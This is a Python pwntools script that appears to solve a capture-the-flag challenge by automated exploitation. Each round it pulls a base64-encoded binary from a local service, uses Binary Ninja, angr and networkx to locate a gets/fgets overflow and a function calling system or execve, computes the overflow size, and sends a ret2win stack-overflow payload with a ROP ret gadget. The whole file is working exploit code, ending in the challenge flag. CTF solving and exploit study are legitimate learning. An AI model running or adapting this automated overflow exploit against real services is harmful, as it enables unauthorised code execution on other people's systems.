#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import base64
import binaryninja
import angr
import claripy
import networkx as nx
import subprocess
import re

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'blala'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def get_binary():
    io.recvuntil(b"----------------")
    binary = io.recvuntil(b"----------------").split(b"\n")[1]
    binary = base64.b64decode(binary)

    with open("chall.bin", "wb") as f:
        f.write(binary)

def find_vuln(bv):
    vuln_funcs = ["fgets", "gets"]
    for f in vuln_funcs:
        func = bv.get_functions_by_name(f)
        if not func:
            continue

        # find func calling gets
        return func[0].callers[0].start

    return None

def find_win(bv):
    funcs = ["execve", "system"]

    for f in bv.functions:
        if any(fn in f.name for fn in funcs):
            for ref in f.callers:
                return ref

    return None
    '''
    for s in bv.strings:
        if any(kw in s.value for kw in known_flag_names):
            for ref in bv.get_code_refs(string.start):
                print(ref)
    '''

def _extract_function_graph(bv):
    G = nx.DiGraph()
    for func in bv.functions:
        G.add_node(func.start)
        for caller in func.callers:
            G.add_edge(caller.start, func.start)
        for callee in func.callees:
            G.add_edge(func.start, callee.start)
    return G

def find_path(bv, vuln, win):
    G = _extract_function_graph(bv)
    main = bv.get_functions_by_name("main")[0].start

    try:
        path = nx.shortest_path(G, source=main, target=vuln)
    except Exception:
        try:
            path = nx.shortest_path(G, source=main, target=win)
        except Exception:
            log.error("Unable to find path between main and vuln")
            return None

    proj = angr.Project("./chall.bin", auto_load_libs=False)
    state = proj.factory.entry_state()

    #proj.hook_symbol('__isoc99_scanf', MyScanfHook(), replace=True)

    #stdin = claripy.BVS("stdin", 0x80*8)
    initial_state = proj.factory.entry_state(
        add_options={
            angr.sim_options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            angr.sim_options.ZERO_FILL_UNCONSTRAINED_MEMORY,
        },
    )
    simgr = proj.factory.simulation_manager(initial_state)

    for x in path:
        print(hex(x))

    for target in path:
        simgr.explore(find=target)
        if len(simgr.found) == 0:
            print(f"Unable to find path to: {hex(target)}")
            return None

        state = simgr.found[0]
        simgr = proj.factory.simulation_manager(state)

    sol = state.posix.dumps(0)
    sol = sol.split(b"\x00")
    sol = [x for x in sol if x.isalpha()]
    return sol

def find_overflow_size(bv):
    win_functions = {"fgets", "gets"}
    vuln_func = None
    vuln_func_bla = None

    for func in bv.functions:
        for win_func in win_functions:
            func = bv.get_functions_by_name(win_func)
            if not func:
                continue

            vuln_func= func[0]
            break

    for param in vuln_func.parameter_vars:
        # variable names in caller of vuln func
        for var in vuln_func.callers[0].stack_layout:
            if var.name == param.name:
                return abs(var.storage)

    return None

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)


for i in range(50):
    print(f"Running round: {i}")
    get_binary()

    bv = binaryninja.load("chall.bin")
    vuln_func = find_vuln(bv)
    if vuln_func == None:
        log.error("Unable to find vuln func")
        exit(0)
    print(f"Vuln func at: {hex(vuln_func)}")

    win = find_win(bv)
    if win == None:
        log.error("Unable to find win func")
        exit(0)
    print(f"win func: at {hex(win.start)}")

    sol = find_path(bv, vuln_func, win.start)
    if sol == None:
        log.error("Unable to find path")
        exit(0)
    print(f"Found sol to reach vuln func: {sol}")

    overflow_sz = find_overflow_size(bv)
    if overflow_sz == None:
        log.error("Unable to find path")
        exit(0)
    print(f"Overflow size: {overflow_sz}")

    ext = bv.get_functions_by_name("exit")[0].start

    rop = ROP("chall.bin")
    ret = rop.find_gadget(["ret"])[0]

    if len(sol) == 0:
        sol = b""
    else:   
        sol = b"\n".join(sol) + b"\n"

    print("Sol path: ", sol)

    payload = (
            sol
            + b"A"*overflow_sz
            + p64(ret)
            + p64(win.start)
            + p64(ext)
    )

    payload = base64.b64encode(payload)
    io.sendlineafter(b"solution:", payload)


io.interactive()
# idek{automation_is_fun_but_it_could_be_funnier_by_being_harder}
